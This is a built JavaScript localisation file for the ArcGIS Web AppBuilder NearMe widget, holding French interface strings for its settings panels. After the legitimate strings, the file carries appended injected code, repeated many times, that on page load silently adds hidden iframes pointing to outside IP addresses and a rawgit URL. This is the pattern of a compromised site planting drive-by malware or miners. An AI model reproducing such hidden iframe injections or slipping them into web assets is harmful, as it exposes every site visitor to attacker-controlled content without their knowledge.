// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
define({"widgets/NearMe/setting/nls/strings":{units:{miles:{displayText:"Miles",acronym:"mi"},kilometers:{displayText:"Kilom\u00e8tres",acronym:"km"},feet:{displayText:"Pieds",acronym:"pi"},meters:{displayText:"M\u00e8tres",acronym:"m"}},searchSourceSetting:{searchSourceSettingTabTitle:"Param\u00e8tres de la source de recherche",searchSourceSettingTitle:"Param\u00e8tres de la source de recherche",searchSourceSettingTitleHintText:"Ajoutez et configurez des services de g\u00e9ocodage ou des couches d\u2019entit\u00e9s en tant que sources de recherche. Ces sources d\u00e9terminent les \u00e9l\u00e9ments pouvant faire l\u2019objet d\u2019une recherche dans la zone de recherche",
addSearchSourceLabel:"Ajouter une source de recherche",featureLayerLabel:"Couche d'entit\u00e9s",geocoderLabel:"G\u00e9ocodeur",nameTitle:"Nom",generalSettingLabel:"Param\u00e8tre g\u00e9n\u00e9ral",allPlaceholderLabel:"Texte d'espace r\u00e9serv\u00e9 pour tout parcourir\u00a0:",allPlaceholderHintText:"Conseil\u00a0: saisissez le texte \u00e0 afficher en tant qu'espace r\u00e9serv\u00e9 pendant la recherche dans toutes les couches et le g\u00e9ocodeur.",generalSettingCheckboxLabel:"Afficher la fen\u00eatre contextuelle de l'entit\u00e9 ou de l'emplacement trouv\u00e9",
countryCode:"Codes de pays ou de r\u00e9gions",countryCodeEg:"par ex. ",countryCodeHint:"Si cette valeur n'est pas renseign\u00e9e, la recherche s'effectue dans tous les pays et toutes les r\u00e9gions",questionMark:"?",searchInCurrentMapExtent:"Rechercher uniquement dans l'\u00e9tendue de la carte actuelle",zoomScale:"Echelle de zoom",locatorUrl:"URL du g\u00e9ocodeur",locatorName:"Nom du g\u00e9ocodeur",locatorExample:"Exemple",locatorWarning:"Cette version du service de g\u00e9ocodage n\u2019est pas prise en charge. Le widget prend en charge le service de g\u00e9ocodage version\u00a010.0 et ult\u00e9rieures.",
locatorTips:"Les suggestions ne sont pas disponibles, car le service de g\u00e9ocodage ne prend pas en charge la fonction de suggestion.",layerSource:"Source de la couche",setLayerSource:"D\u00e9finir la source de la couche",setGeocoderURL:"D\u00e9finir l'URL du g\u00e9ocodeur",searchLayerTips:"Les suggestions ne sont pas disponibles, car le service d'entit\u00e9s ne prend pas en charge la fonction de pagination.",placeholder:"Texte de l\u2019espace r\u00e9serv\u00e9",searchFields:"Champs de recherche",
displayField:"Champ d'affichage",exactMatch:"Correspondance parfaite",maxSuggestions:"Nombre maximal de suggestions",maxResults:"Nombre maximum de r\u00e9sultats",enableLocalSearch:"Activer la recherche locale",minScale:"Echelle. min.",minScaleHint:"Lorsque l'\u00e9chelle de la carte est sup\u00e9rieure \u00e0 cette \u00e9chelle, la recherche locale est appliqu\u00e9e",radius:"Rayon",radiusHint:"Indique le rayon d'une surface autour du centre de la carte qui permet d'optimiser le classement des candidats de g\u00e9ocodage, afin que les plus proches de l'emplacement soient renvoy\u00e9s en premier",
meters:"M\u00e8tres",setSearchFields:"D\u00e9finir les champs de recherche",set:"D\u00e9finir",fieldName:"Nom",invalidUrlTip:"L\u2019URL ${URL} est incorrecte ou inaccessible."},searchSetting:{searchSettingTabTitle:"Param\u00e8tres de recherche",defaultBufferDistanceLabel:"D\u00e9finir la distance par d\u00e9faut de la zone tampon",maxResultCountLabel:"Limiter le nombre de r\u00e9sultats",maxResultCountHintLabel:"Conseil\u00a0: d\u00e9finissez le nombre maximal de r\u00e9sultats visibles. La valeur de 1 renvoie l'entit\u00e9 la plus proche",
maxBufferDistanceLabel:"D\u00e9finir la distance maximum de la zone tampon",bufferDistanceUnitLabel:"Unit\u00e9s de distance de la zone tampon",defaultBufferHintLabel:"Astuce\u00a0: d\u00e9finissez la valeur par d\u00e9faut du curseur de la zone tampon",maxBufferHintLabel:"Astuce\u00a0: d\u00e9finissez la valeur maximum du curseur de la zone tampon",bufferUnitLabel:"Astuce\u00a0: d\u00e9finissez l\u2019unit\u00e9 pour cr\u00e9er la zone tampon",selectGraphicLocationSymbol:"Symbole d\u2019adresse ou d\u2019emplacement",
graphicLocationSymbolHintText:"Astuce\u00a0: symbole d\u2019une adresse recherch\u00e9e ou d\u2019un emplacement s\u00e9lectionn\u00e9",addressLocationPolygonHintText:"Astuce\u00a0: symbole de la couche de polygones faisant l'objet d'une recherche",popupTitleForPolygon:"S\u00e9lectionnez un polygone pour l'emplacement de l'adresse s\u00e9lectionn\u00e9e",popupTitleForPolyline:"S\u00e9lectionnez une ligne pour l'emplacement de l'adresse",addressLocationPolylineHintText:"Astuce\u00a0: symbole de la couche de polylignes faisant l'objet d'une recherche",
fontColorLabel:"S\u00e9lectionner la couleur de police pour les r\u00e9sultats de la recherche",fontColorHintText:"Astuce\u00a0: couleur de police des r\u00e9sultats de la recherche",zoomToSelectedFeature:"Zoom sur l'entit\u00e9 s\u00e9lectionn\u00e9e",zoomToSelectedFeatureHintText:"Astuce\u00a0: zoomez sur l'entit\u00e9 s\u00e9lectionn\u00e9e au lieu de la zone tampon",intersectSearchLocation:"Revenir aux polygones d'intersection",intersectSearchLocationHintText:"Astuce\u00a0: renvoyez les polygones contenant l'emplacement recherch\u00e9 au lieu des polygones au sein de la zone tampon",
enableProximitySearch:"Activer la recherche de proximit\u00e9",enableProximitySearchHintText:"Astuce : Activez la fonction de recherche des emplacements \u00e0 proximit\u00e9 d\u2019un r\u00e9sultat recherch\u00e9",bufferVisibilityLabel:"D\u00e9finir la visibilit\u00e9 de la zone tampon",bufferVisibilityHintText:"Astuce\u00a0: la zone tampon s'affichera sur la carte",bufferColorLabel:"D\u00e9finir le symbole de la zone tampon",bufferColorHintText:"Astuce\u00a0: s\u00e9lectionnez la couleur et la transparence de la zone tampon",
searchLayerResultLabel:"Dessiner uniquement les r\u00e9sultats de la couche s\u00e9lectionn\u00e9e",searchLayerResultHint:"Astuce\u00a0: seule la couche s\u00e9lectionn\u00e9e dans les r\u00e9sultats de recherche s'affichera sur la carte.",showToolToSelectLabel:"Bouton D\u00e9finir l'emplacement",showToolToSelectHintText:"Conseil\u00a0: fournit un bouton permettant de d\u00e9finir un emplacement sur la carte au lieu de toujours configurer l'emplacement lorsque l'utilisateur clique sur la carte",geoDesicParamLabel:"Bouton Zone tampon g\u00e9od\u00e9sique",
geoDesicParamHintText:"Conseil\u00a0: utilisez une zone tampon g\u00e9od\u00e9sique plut\u00f4t qu'une zone tampon euclidienne (plane)"},layerSelector:{selectLayerLabel:"S\u00e9lectionner des couches de recherche",layerSelectionHint:"Astuce\u00a0: utilisez le bouton D\u00e9finir pour s\u00e9lectionner les couches",addLayerButton:"D\u00e9finir"},routeSetting:{routeSettingTabTitle:"Attributs de direction",routeServiceUrl:"Service de calcul d'itin\u00e9raire",buttonSet:"D\u00e9finir",routeServiceUrlHintText:"Astuce\u00a0: cliquez sur D\u00e9finir pour rechercher et s\u00e9lectionner un service de calcul d'itin\u00e9raire",
directionLengthUnit:"Unit\u00e9s de longueur de la direction",unitsForRouteHintText:"Astuce\u00a0: utilis\u00e9 pour afficher les unit\u00e9s de l\u2019itin\u00e9raire",selectRouteSymbol:"S\u00e9lectionner le symbole pour afficher l\u2019itin\u00e9raire",routeSymbolHintText:"Astuce\u00a0: utilis\u00e9 pour afficher le symbole lin\u00e9aire de l\u2019itin\u00e9raire",routingDisabledMsg:"Pour activer les directions, assurez-vous que le calcul d\u2019itin\u00e9raire est activ\u00e9 dans l\u2019\u00e9l\u00e9ment dans les param\u00e8tres d\u2019application."},
symbologySetting:{symbologySettingTabTitle:"Param\u00e8tres de symbologie",addSymbologyBtnLabel:"Ajouter de nouveaux symboles",layerNameTitle:"Nom de la couche",fieldTitle:"Champ",valuesTitle:"Valeurs",symbolTitle:"Symbole",actionsTitle:"Actions",invalidConfigMsg:"Champ en double\u00a0: ${fieldName} pour la couche\u00a0: ${layerName}"},filterSetting:{filterSettingTabTitle:"Param\u00e8tres de filtre",addTaskTip:"Ajoutez un ou plusieurs filtres \u00e0 la ou aux couches de recherche s\u00e9lectionn\u00e9es et configurez les param\u00e8tres de chacun d\u2019entre eux.",
enableMapFilter:"Supprimez le filtre pr\u00e9d\u00e9fini de la couche de la carte.",newFilter:"Nouveau filtre",filterExpression:"Expression de filtre",layerDefaultSymbolTip:"Utiliser le symbole par d\u00e9faut de la couche",uploadImage:"Charger une image",selectLayerTip:"S\u00e9lectionnez une couche.",setTitleTip:"D\u00e9finissez le titre.",noTasksTip:"Aucun filtre configur\u00e9. Cliquez sur \u00ab\u00a0${newFilter}\u00a0\u00bb pour en ajouter une nouvelle.",collapseFiltersTip:"R\u00e9duire les expressions de filtre (le cas \u00e9ch\u00e9ant) \u00e0 l\u2019ouverture du widget"},
networkServiceChooser:{arcgislabel:"Ajouter depuis ArcGIS Online",serviceURLabel:"Ajouter une URL de service",routeURL:"URL de l\u2019itin\u00e9raire",validateRouteURL:"Valider",exampleText:"Exemple",hintRouteURL1:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/",hintRouteURL2:"https://route.arcgis.com/arcgis/rest/services/World/Route/NAServer/Route_World",invalidRouteServiceURL:"Sp\u00e9cifiez un service d\u2019itin\u00e9raire valide.",rateLimitExceeded:"Limite de d\u00e9bit atteinte. R\u00e9essayez ult\u00e9rieurement.",
errorInvokingService:"Le nom d'utilisateur ou le mot de passe est incorrect."},errorStrings:{bufferErrorString:"Saisissez une valeur num\u00e9rique valide.",selectLayerErrorString:"S\u00e9lectionnez les couches \u00e0 rechercher.",invalidDefaultValue:"La distance de la zone tampon par d\u00e9faut ne peut pas \u00eatre vide. Veuillez sp\u00e9cifier la distance de la zone tampon.",invalidMaximumValue:"La distance de la zone tampon maximale ne peut pas \u00eatre vide. Veuillez sp\u00e9cifier la distance de la zone tampon.",
defaultValueLessThanMax:"Sp\u00e9cifiez la distance de la zone tampon par d\u00e9faut au sein de la limite maximale",defaultBufferValueGreaterThanOne:"La distance de la zone tampon par d\u00e9faut ne peut pas \u00eatre inf\u00e9rieure \u00e0 0",maximumBufferValueGreaterThanOne:"Sp\u00e9cifiez une distance de la zone tampon maximale sup\u00e9rieure \u00e0\u00a00",invalidMaximumResultCountValue:"Sp\u00e9cifiez une valeur valide pour le nombre maximal de r\u00e9sultats",invalidSearchSources:"Param\u00e8tres de source de recherche non valides"},
symbolPickerPreviewText:"Aper\u00e7u :",_localized:{}}});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});